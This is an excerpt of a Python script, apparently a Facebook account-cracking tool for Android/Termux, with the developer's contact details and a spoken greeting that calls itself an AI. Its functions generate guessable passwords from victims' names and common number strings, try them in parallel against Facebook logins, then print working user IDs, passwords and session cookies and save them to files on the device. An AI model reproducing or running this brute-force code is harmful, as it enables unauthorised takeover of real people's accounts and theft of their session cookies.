...
number=int("+8801709045888")

devoloper_info={
    "Developer" :  '𝗠𝗗 𝗝𝗨𝗕𝗔𝗘𝗗 𝗔𝗛𝗠𝗘𝗗 𝗝𝗢𝗬',
    "Number" :  '01709045888',
    "Address" :  'Sarishabari, Jamalpur',
    "GitHub Url":  'https://github.com/MD-JUBAED-AHMED-JOY',
    "Facebook" :  'https://www.facebook.com/profile.php?id=100001741442385',
    }
...
note1="""- __Inbox__ Me for Join `T D S `\n- Try tool and **Review**"""
n1=Markdown(note1)
...
def main():
    ...
    space()
    dual("Hello bro,I am Bayjid,I am an artificial intelligent,and welcome to our tool","y.mp3")
...
def numb():
    ...
    with ThreadPool (max_workers=50) as feel:
        ...
        for i in user:
            ...
            name=i.split("|")[1]
            namex=name.lower()
            pwx=["57273200","57575751","59039200","506070","708090","203040"]
            try:
                n1=namex.split(" ")[0]
                if len(n1) >=2:
                    pwx.append(n1+"123")
...
def need(uid,pwx,tl):
    ...
    sys.stdout.write(f"\r  \033[1;31m[\033[38;5;46m𝐅𝐈𝐍𝐃𝐈𝐍𝐆\033[1;31m] -[\033[1;31m{'{:.1%}'.format(loop/int(tl))}\033[1;31m]-[\033[38;5;46m{loop}\033[1;31m]\033[38;5;46m \r "),
    sys.stdout.flush()
    try:
        for ps in pwx:
            ...
            if "session_key" in heron_brand:
                ...
                if "yes" in cook:
                    print(f"\r\r[white reverse][JOY]=UID/PAS[/white reverse] [bold green]{xd} [cyan]â€¢ [black reverse]{ps}[/black reverse] \n[yellow reverse]COOKIES=[ðŸ”¶][/yellow reverse][bold green]{coki}\n\n\n")
                else:
                    print(f"\r\r[white reverse][JOY]=UID/PAS[/white reverse] [bold green]{xd} [cyan]â€¢ [black reverse]{ps}[/black reverse] ")
                open("/sdcard/JOY OK-ID.txt","a").write(xd+"|"+ps+"|"+coki+"\n")
                
                ok.append(uid)
                break
            elif "www.facebook.com" in str(heron_brand):
                open("/sdcard/JOY CP-ID.txt","a").write(uid+"|"+ps+"\n")
                break 
            else:
                continue
        loop+=1
...
def needx(uid,pwx,fb,tl):
    global ok,ugen,loop,cook
    session=requests.session()
    sys.stdout.write(f"\r\033[1;31m [\033[38;5;46m𝐅𝐈𝐍𝐃𝐈𝐍𝐆\033[1;31m]-[\033[38;5;46m{'{:.1%}'.format(loop/int(tl))}\033[1;31m]-[\x1b[38;5;208m{loop}\033[1;31m/\033[38;5;46m{str(len(ok))}\033[1;31m]\033[38;5;46m  "),
    sys.stdout.flush()
    try:
        for ps in pwx:
            ...
            if "c_user" in heron_brand:
                ...
                xd=xx[:15]
                if "yes" in cook:
                    print(f"\r\r\n[white reverse][JOY]=UID/PAS[/white reverse] [bold green]{xd} [cyan] [black reverse]{ps}[/black reverse] \n[yellow reverse]COOKIES=[ðŸ”¶][/yellow reverse][bold green]{coki}\n")
                else:
                    print(f"\r\r[white reverse][JOY]=UID/PAS[/white reverse] [bold green]{xd} [cyan][black reverse]{ps}[/black reverse] ")
                open("/sdcard/joy.OK-ID.txt","a").write(xd+"|"+ps+"|"+coki+"\n")
                ok.append(uid)
                break 
